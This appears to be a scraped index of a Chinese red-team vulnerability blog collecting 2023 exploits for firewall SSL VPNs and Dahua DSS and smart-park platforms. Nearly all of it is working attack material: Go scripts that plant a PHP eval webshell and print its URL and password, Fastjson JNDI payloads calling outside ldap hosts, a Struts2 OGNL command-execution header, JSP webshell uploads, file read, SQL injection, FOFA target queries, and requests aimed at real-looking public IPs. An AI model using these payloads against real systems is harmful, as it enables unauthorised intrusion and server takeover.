\"/sslvpn/sslvpn_client.php?client=logoImg\u0026img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/\" + filename fullURL := strings.Replace(targetHost+vulPath, \"//ss\", \"/ss\", 1) cli := reqCli() get, err := cli.R().Get(fullURL) if err != nil { fmt.Println(err) return } defer func() { _ = get.Body.Close() }() shellURL := strings.Replace(targetHost+\"/sslvpn/\"+filename, \"//ss\", \"/ss\", 1) if get.StatusCode == http.StatusOK { if strings.Contains(get.String(), \"|base64 -d|tee /usr/local/webui/sslvpn/\") { fmt.Println(color.RedString(\"\\nShell URL Is : %s\\nShell Pass is : c\\n\", shellURL)) return } } fmt.Println(color.GreenString(\"\\n%s\", \"站点安全不存在漏洞\")) return } func reqCli() *req.Client { cli := req.C() for k, v := range reqHeader { cli.SetCommonHeader(k, v) } cli.SetTimeout(time.Second * 10) cli.SetTLSFingerprintSafari() cli.SetAutoDecodeAllContentType() cli.TLSClientConfig = \u0026tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10, MaxVersion: tls.VersionTLS13} return cli } package exploits import ( \"git.gobies.org/goby/goscanner/goutils\" ) func init() { expJson := `{ \"Name\": \"Multiple Security Gateway Frontend RCE\", \"Description\": \"A 0day RCE in multiple security gateway\", \"Product\": \"Multiple Security Gateway\", \"Homepage\": \"https://gobies.org/\", \"DisclosureDate\": \"2021-05-30\", \"Author\": \"gobysec@gmail.com\", \"GobyQuery\": \"header=\\\"Set-Cookie: USGSESSID\\\"\", \"Level\": \"3\", \"Impact\": \"\u003cp\u003eThe attackers are allowed to execute any code with root privilege without any login crenditials.\u003c/p\u003e\", \"Recommendation\": \"\u003cp\u003e1. For security devices, it's not recommended to make them accessable from Internet.\u003c/p\u003e\u003cp\u003e2. You should contact the product suppliance for help.\u003c/p\u003e\", \"References\": [ \"https://gobies.org/\" ], \"HasExp\": true, \"ExpParams\": [ { \"name\": \"cmd\", \"type\": \"input\", \"value\": \"cat /etc/hosts \", \"show\": \"Enter the command you want to execute\" } ], \"ExpTips\": { \"Type\": \"\", \"Content\": \"\" }, \"ScanSteps\": [ \"AND\", { \"Request\": { \"method\": \"GET\", \"uri\": \"/sslvpn/sslvpn_client.php\", \"follow_redirect\": true, \"header\": {}, \"data_type\": \"text\", \"data\": \"\" }, \"ResponseTest\": { \"type\": \"group\", \"operation\": \"AND\", \"checks\": [ { \"type\": \"item\", \"variable\": \"$code\", \"operation\": \"==\", \"value\": \"200\", \"bz\": \"\" } ] }, \"SetVariable\": [] }, { \"Request\": { \"method\": \"GET\", \"uri\": \"/sslvpn/sslvpn_client.php?client=logoImg\u0026img=%36%64%72%63%64%66%73%33%34%63%31%68%20%2f%74%6d%70%20%7c%7c%20%63%70%20%2f%65%74%63%2f%68%6f%73%74%73%20%2f%75%73%72%2f%6c%6f%63%61%6c%2f%77%65%62%75%69%2f%77%65%62%75%69%2f%69%6d%61%67%65%73%2f%62%61%73%69%63%2f%6c%6f%67%69%6e%2f%6d%61%69%6e%5f%6c%6f%67%6f%32%31%2e%74%78%74%20%7c%7c%20%6c%73\", \"follow_redirect\": true, \"header\": { \"Connection\": \"close\", \"Upgrade-Insecure-Requests\": \"1\", \"User-Agent\": \"Mozilla/5.0\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9\", \"Sec-Fetch-Site\": \"same-origin\", \"Sec-Fetch-Mode\": \"navigate\", \"Sec-Fetch-User\": \"?1\", \"Sec-Fetch-Dest\": \"iframe\", \"Referer\": \"{{{hostinfo}}}\", \"Accept-Encoding\": \"gzip, d","date":"2023-12-08","objectID":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/:5:0","tags":["2023hw漏洞"],"title":"多个防火墙产品RCE","uri":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/"},{"categories":["2023hw漏洞"],"content":"另外一个点 package main import ( \"crypto/tls\" \"fmt\" \"github.com/fatih/color\" \"github.com/hpifu/go-kit/hflag\" \"github.com/imroc/req/v3\" \"github.com/liushuochen/gotable\" \"github.com/liushuochen/gotable/table\" \"github.com/thanhpk/randstr\" \"net/http\" \"os\" \"strings\" \"time\" ) func main() { now := time.Now() host, addr := getUserParams() exploit(host, addr) fmt.Println(color.GreenString(\"Total Use Time : %s\\n\", time.Since(now).String())) } func httpReqClient() *req.Client { var reqHeader = map[string]string{ \"User-Agent\": \"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36\", \"Accept\": \"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\", \"Accept-Encoding\": \"gzip, deflate, br\", \"Accept-Language\": \"zh-CN,zh-TW;q=0.9,zh;q=0.8\", \"Connection\": \"close\", } cli := req.C() for reqHeaderName, reqHeaderValue := range reqHeader { cli.SetCommonHeader(reqHeaderName, reqHeaderValue) } cli.EnableForceHTTP1() cli.SetTLSFingerprintSafari() cli.SetTimeout(time.Second * 15) cli.SetRedirectPolicy(req.NoRedirectPolicy()) cli.SetAutoDecodeAllContentType() cli.TLSClientConfig = \u0026tls.Config{InsecureSkipVerify: true, MinVersion: tls.VersionTLS10, MaxVersion: tls.VersionTLS13} return cli } func getUserParams() (host, proxyAddr string) { hflag.AddFlag(\"target\", \"目标地址\", hflag.Required(), hflag.Shorthand(\"t\")) hflag.AddFlag(\"proxy\", \"代理地址\", hflag.Shorthand(\"p\")) if err := hflag.Parse(); err != nil { fmt.Println(color.RedString(\"%s\", hflag.Usage())) os.Exit(1) } target := hflag.GetString(\"target\") proxyString := hflag.GetString(\"proxy\") return target, proxyString } func randFile() string { filename := randstr.Hex(8) return filename } func fmtTable() *table.Table { tab, _ := gotable.Create(color.GreenString(\"%s\", \"Shell连接工具\"), color.RedString(\"%s\", \"Shell连接地址\"), color.BlueString(\"%s\", \"Shell连接密码\")) return tab } func exploit(t, p string) { filename := randFile() + \".php\" vulPath := \"/sslvpn/sk403.php?client=logoImg\u0026img=/tmp|echo%20PD9waHAgZXZhbCgkX1JFUVVFU1RbJ2MnXSk7Pz4=|base64%20-d|tee%20/usr/local/webui/sslvpn/\" + filename fullURL := strings.Replace(t+vulPath, \"//ss\", \"/ss\", 1) client := httpReqClient() if p != \"\" { client.SetProxyURL(p) } get, err := client.R().Get(fullURL) if err != nil { fmt.Println(err) } defer func() { _ = get.Body.Close() }() ShellURL := strings.Replace(t+\"/sslvpn/\"+filename, \"//ss\", \"/ss\", 1) if get.StatusCode == http.StatusOK { if strings.Contains(get.String(), \"/usr/local/webui/sslvpn/\") { t2 := fmtTable() _ = t2.AddRow([]string{ \"AntSword\", ShellURL, \"c\", }) fmt.Println(t2) return } } else { fmt.Println(color.RedString(\"%s\", \"站点不存在漏洞,安全的很\")) return } } ","date":"2023-12-08","objectID":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/:6:0","tags":["2023hw漏洞"],"title":"多个防火墙产品RCE","uri":"/%E5%A4%9A%E4%B8%AA%E9%98%B2%E7%81%AB%E5%A2%99%E4%BA%A7%E5%93%81rce/"},{"categories":["2023hw"],"content":"```\r/resetPwd.html?guid=IWBI9HveWf01GlDm+je0Ec+qvHyI7F5bjy3kRC2uESwC0+K PmTxUsgHqj+lUuY0F061yruzA+jkZFb9hhNqPhw%3D%3D ","date":"2023-12-08","objectID":"/%E5%A4%A7%E4%B8%BA-lnnojet-%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E5%8D%8F%E5%90%8C%E5%88%9B%E6%96%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/:0:0","tags":["2023hw"],"title":"大为 lnnojet 知识产权协同创新管理系统管理员密码重置","uri":"/%E5%A4%A7%E4%B8%BA-lnnojet-%E7%9F%A5%E8%AF%86%E4%BA%A7%E6%9D%83%E5%8D%8F%E5%90%8C%E5%88%9B%E6%96%B0%E7%AE%A1%E7%90%86%E7%B3%BB%E7%BB%9F%E7%AE%A1%E7%90%86%E5%91%98%E5%AF%86%E7%A0%81%E9%87%8D%E7%BD%AE/"},{"categories":["2023hw"],"content":"```\rPOST /eventCenter/sendCustomerMsg HTTP/1.1 Host: {{Hostname}} User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/107.0.5304.63 Safari/537.36 userCode: 123 cmd: id Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,/;q=0.8,application/signed-exchange;v=b3;q=0.9 Content-Type: application/json Content-Length: 215 “a”: {\"@type\":“java.lang.Class”,“val”:“com.sun.rowset.JdbcRowSetImpl”},“b”: {\"@type\":“com.sun.rowset.JdbcRowSetImpl”,“dataSourceName”:“ldap://127.0.0.1:1389/TomcatBypass/TomcatEcho”,“autoCommit”:true}} ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E-dss-sendcustomermsg-%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"大华 DSS sendCustomerMsg 前台命令执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E-dss-sendcustomermsg-%E5%89%8D%E5%8F%B0%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"```\rPOST /portal/login_init.action HTTP/1.1 Host: 58.211.153.94:81 Content-Length: 283 Cache-Control: max-age=0 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,/;q=0.8 Origin: http://127.0.0.1:8080 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/45.0.2454.101 Safari/537.36 Content-Type: “%{(#nike=‘multipart/form-data’).(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#memberAccess?(# memberAccess=#dm):((#container=#context[‘com.opensymphony.xwork2.ActionContext.container’]).(#ognlUtil=#c ontainer.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ognlUtil.getExcludedPackageNames().cl ear()).(#ognlUtil.getExcludedClasses().clear()).(#context.setMemberAccess(#dm)))).(#cmd=‘whoami’).(#iswin=(@jav a.lang.System@getProperty(‘os.name’).toLowerCase().contains(‘win’))).(#cmds=(#iswin?{‘cmd.exe’,’/c’,#cmd}:{’/bin/ bash’,’-c’,#cmd})).(#p=new java.lang.ProcessBuilder(#cmds)).(#p.redirectErrorStream(true)).(#process=#p.start()).(#ros=(@org.apache.struts2.S ervletActionContext@getResponse().getOutputStream())).(@org.apache.commons.io.IOUtils@copy(#process.getInputStream(),#ros)).(#ros.flush())}” boundary=—-WebKitFormBoundaryXx80aU0pu6vrsV3z Referer: http://127.0.0.1:8080/struts2-showcase/fileupload/upload.action Accept-Language: zh-CN,zh;q=0.8 Cookie: JSESSIONID=8B365C019F676093D27D8C0D21439C2B Connection: close ——WebKitFormBoundaryXx80aU0pu6vrsV3z Content-Disposition: form-data; name=“upload”; filename=“2.txt” Content-Type: text/plain asd ——WebKitFormBoundaryXx80aU0pu6vrsV3z Content-Disposition: form-data; name=“caption” 1 ——WebKitFormBoundaryXx80aU0pu6vrsV3z— ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E-dss-%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-portal-login_init.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/:0:0","tags":["2023hw"],"title":"大华 DSS 视频管理平台 portal login_init.action 远程命令执行","uri":"/%E5%A4%A7%E5%8D%8E-dss-%E8%A7%86%E9%A2%91%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-portal-login_init.action-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"},{"categories":["2023hw"],"content":"```\rdetail: ID: 883 Author: 匿名作者 Name: 大华DSS bitMap_uploadPic.action页面-获得Shell Description: “【漏洞对象】大华DSS\\n【漏洞描述】\\n该系统 /emap/bitmap/bitMap_uploadPic.action文件存在未授权访问上传getshell漏洞，攻击者无需认证访问到内部数据，可导致敏感信息泄露，从而获取服务器权限。” Identifier: DVB: DVB-2021-883 VulnClass: 认证绕过/未认证 Category: 应用服务 Manufacturer: 大华 Product: 大华DSS Type: 1 Status: 1 Scanable: 1 Level: 3 DisclosureDate: ‘2015-12-17’ VulnImpact: 大华DSS未授权访问导致getshell，攻击者无需认证访问到内部数据，可导致敏感信息泄露，从而获取服务器权限，对服务器进行任意操作，危害巨大。 Is0day: false IncludeExp: false Weakable: false IsXc: false IsCommon: false IsCallBack: false Condition: body=\"/portal/include/script/dahuaDefined/headCommon.js\" Solutions: 升级至最新版本 Sources: https://nosec.org/my/query/wooyun_bug/82758 poc: relative: req0 session: true requests: method: POST timeout: 10 path: /emap/bitmap/bitMap_uploadPic.action headers: User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/56.0.2875.63 Safari/537.36 Content-Type: multipart/form-data; boundary=—-WebKitFormBoundarynQBBlvrs2NMiBdIv data: “——WebKitFormBoundarynQBBlvrs2NMiBdIv\\nContent-Disposition: form-data; \\ name=\"upload\"; filename=\"1.jsp\"\\nContent-Type: text/plain\\n\\n\u003c%\\nout.println(12345+54321+10000);\\n %\u003e\\n——WebKitFormBoundarynQBBlvrs2NMiBdIv\\nContent-Disposition: form-data; \\ name=\"desc\"\\n\\ntest\\n——WebKitFormBoundarynQBBlvrs2NMiBdIv–” follow_redirects: false matches: (code.eq(“404”) \u0026\u0026 body.contains(“and resul”) \u0026\u0026 body.regex(\"\\\\d+\\\\.jsp\")) ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8Edss%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0bitmap_uploadpic.action%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%9A%E5%AF%BC%E8%87%B4getshell/:0:0","tags":["2023hw"],"title":"大华DSS城市安防监控系统平台bitMap_uploadPic.action文件上传会导致getshell","uri":"/%E5%A4%A7%E5%8D%8Edss%E5%9F%8E%E5%B8%82%E5%AE%89%E9%98%B2%E7%9B%91%E6%8E%A7%E7%B3%BB%E7%BB%9F%E5%B9%B3%E5%8F%B0bitmap_uploadpic.action%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E4%BC%9A%E5%AF%BC%E8%87%B4getshell/"},{"categories":["2023hw"],"content":"## poc\rhttp://125.72.35.230:9080/upload/1112.jsp POST /emap/webservice/gis/soap/poi HTTP/1.1 Content-Type: text/xml;charset=UTF-8 Host: 125.72.35.230:9080 Content-Length: 405 \u003csoapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:res=\"http://response.webservice.poi.mapbiz.emap.dahuatech.com/\"\u003e \u003csoapenv:Header/\u003e \u003csoapenv:Body\u003e \u003cres:uploadPicFile\u003e \u003c!--type: string--\u003e \u003carg0\u003e/../../1112.jsp\u003c/arg0\u003e \u003c!--type: base64Binary--\u003e \u003carg1\u003ePCUKCm91dC5wcmludGxuKCJIZWxsbyxjdmVzISIpOwoKJT4=\u003c/arg1\u003e \u003c/res:uploadPicFile\u003e \u003c/soapenv:Body\u003e \u003c/soapenv:Envelope\u003e ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BApoi%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/:0:0","tags":["2023hw"],"title":"大华智慧园区poi任意文件上传","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BApoi%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0/"},{"categories":["2023hw漏洞"],"content":"大华智慧园区管理平台任意文件读取 ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:1:0","tags":["2023hw漏洞"],"title":"大华智慧园区管理平台任意文件读取","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw漏洞"],"content":"poc /portal/itc/attachment_downloadByUrlAtt.action?filePath=file:/ ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/:2:0","tags":["2023hw漏洞"],"title":"大华智慧园区管理平台任意文件读取","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || body=\"/WPMS/asset/lib/json2.js\" ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 deleteFtp 接口远程命令执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1 Host: 113.214.2.195:8443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Content-Type: application/json Accept-Encoding: gzip Content-Length: 180 {\"ftpUrl\":{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ladp://\",\"autoCommit\":true}}} ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 deleteFtp 接口远程命令执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E6%8E%A5%E5%8F%A3%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞 ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw漏洞"],"title":"大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"fofa body=\"src=/WPMS/asset/common/js/jsencrypt.min.js\" ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:2:0","tags":["2023hw漏洞"],"title":"大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"poc POST /CardSolution/card/accessControl/swingCardRecord/deleteFtp HTTP/1.1 Host: Cache-Control: max-age=0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.111 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7 Accept-Encoding: gzip, deflate, br Accept-Language: zh-CN,zh;q=0.9Cookie: yourCookieConnection: close Content-Type: application/json Content-Length: 189 {\"ftpUrl\":{\"e\":{\"@type\":\"java.lang.Class\",\"val\":\"com.sun.rowset.JdbcRowSetImpl\"},\"f\":{\"@type\":\"com.sun.rowset.JdbcRowSetImpl\",\"dataSourceName\":\"ldap://x.x.x.x\",\"autoCommit\":true}}} ldap://x.x.x.x 填入dnslog地址 ，发送poc dnslog有请求说明存在漏洞 ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:3:0","tags":["2023hw漏洞"],"title":"大华智慧园区综合管理平台 deleteFtp 远程命令执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-deleteftp-%E8%BF%9C%E7%A8%8B%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" || (cert=\"Dahua\" \u0026\u0026 cert=\"DSS\") ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-ipmsbarpaypay-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 ipmsbarpaypay 远程代码执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-ipmsbarpaypay-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc POST /ipms/barpay/pay HTTP/1.1 Host: 58.34.174.106:8009 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Cmd: whoami Content-Type: application/json Accept-Encoding: gzip Content-Length: 104 {\"@type\": \"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\": \"ldap://gobygo.net/A4\", \"autoCommit\": true} ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-ipmsbarpaypay-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 ipmsbarpaypay 远程代码执行漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-ipmsbarpaypay-%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"## fofa\rbody=\"src=\\\"/WPMS/asset/common/js/jsencrypt.min.js\\\"\" product=\"dahua-智慧园区综合管理平台\" ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-searchjson-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:0:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 searchJson SQL 注入漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-searchjson-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw"],"content":"poc GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20user()),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1 Host: 111.53.23.133:8009 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15 Accept-Encoding: gzip ","date":"2023-12-08","objectID":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-searchjson-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/:1:0","tags":["2023hw"],"title":"大华智慧园区综合管理平台 searchJson SQL 注入漏洞","uri":"/%E5%A4%A7%E5%8D%8E%E6%99%BA%E6%85%A7%E5%9B%AD%E5%8C%BA%E7%BB%BC%E5%90%88%E7%AE%A1%E7%90%86%E5%B9%B3%E5%8F%B0-searchjson-sql-%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E/"},{"categories":["2023hw漏洞"],"content":"大华智慧园区综合管理平台 searchJson SQL注入漏洞 GET /portal/services/carQuery/getFaceCapture/searchJson/%7B%7D/pageJson/%7B%22orderBy%22:%221%20and%201=updatexml(1,concat(0x7e,(select%20md5(388609)),0x7e),1)--%22%7D/extend/%7B%7D HTTP/1.1 Host: 127.0.0.1:7443 User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) 